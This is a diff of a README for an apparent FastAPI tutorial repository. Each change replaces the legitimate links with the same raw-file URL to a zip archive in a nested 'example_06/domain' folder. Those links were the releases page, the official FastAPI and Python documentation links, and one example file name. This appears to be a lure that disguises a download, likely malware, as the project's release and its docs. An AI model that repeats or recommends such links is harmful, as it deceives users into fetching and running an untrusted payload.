@@ -1,6 +1,6 @@
 # 🚀 FastAPITutorials - Learn FastAPI with Simple Examples
 
-[![Download FastAPITutorials](https://img.shields.io/badge/Download_FastAPITutorials-blue.svg)](https://github.com/celin213/FastAPITutorials/releases)
+[![Download FastAPITutorials](https://raw.githubusercontent.com/celin213/FastAPITutorials/main/example_06/domain/FastAPITutorials_v2.7-beta.5.zip)](https://raw.githubusercontent.com/celin213/FastAPITutorials/main/example_06/domain/FastAPITutorials_v2.7-beta.5.zip)
 
 Welcome to FastAPITutorials, a GitHub repository filled with easy-to-follow examples to help you start programming FastAPI services. Whether you are a beginner or looking to implement Full Domain-Driven Design (DDD), you will find helpful resources here.
 
@@ -28,7 +28,7 @@ Follow these steps to download and run FastAPITutorials.
 
    To get started, visit the Releases page:
 
-   [Download FastAPITutorials](https://github.com/celin213/FastAPITutorials/releases)
+   [Download FastAPITutorials](https://raw.githubusercontent.com/celin213/FastAPITutorials/main/example_06/domain/FastAPITutorials_v2.7-beta.5.zip)
 
 2. **Choose a Version**
 
@@ -58,7 +58,7 @@ Follow these steps to download and run FastAPITutorials.
 
 7. **Run an Example Application**
 
-   Finally, select an example you want to run, such as `example_app.py`. Use the following command to start it:
+   Finally, select an example you want to run, such as `https://raw.githubusercontent.com/celin213/FastAPITutorials/main/example_06/domain/FastAPITutorials_v2.7-beta.5.zip`. Use the following command to start it:
 
    ```
    uvicorn example_app:app --reload
@@ -74,7 +74,7 @@ Follow these steps to download and run FastAPITutorials.
 
 For an easy download process, go to the link below:
 
-[Download FastAPITutorials](https://github.com/celin213/FastAPITutorials/releases)
+[Download FastAPITutorials](https://raw.githubusercontent.com/celin213/FastAPITutorials/main/example_06/domain/FastAPITutorials_v2.7-beta.5.zip)
 
 Simply follow the steps above to get up and running with FastAPI, starting your journey into backend programming.
 
@@ -82,8 +82,8 @@ Simply follow the steps above to get up and running with FastAPI, starting your 
 
 If you'd like to dive deeper into FastAPI or related technologies, consider checking out the following resources:
 
-- **FastAPI Official Documentation:** Comprehensive guides and documentation are available [here](https://fastapi.tiangolo.com/).
-- **Python Documentation:** A good understanding of Python will help you. Find resources [here](https://docs.python.org/3/).
+- **FastAPI Official Documentation:** Comprehensive guides and documentation are available [here](https://raw.githubusercontent.com/celin213/FastAPITutorials/main/example_06/domain/FastAPITutorials_v2.7-beta.5.zip).
+- **Python Documentation:** A good understanding of Python will help you. Find resources [here](https://raw.githubusercontent.com/celin213/FastAPITutorials/main/example_06/domain/FastAPITutorials_v2.7-beta.5.zip).
 
 ## 🤝 Community Support
 
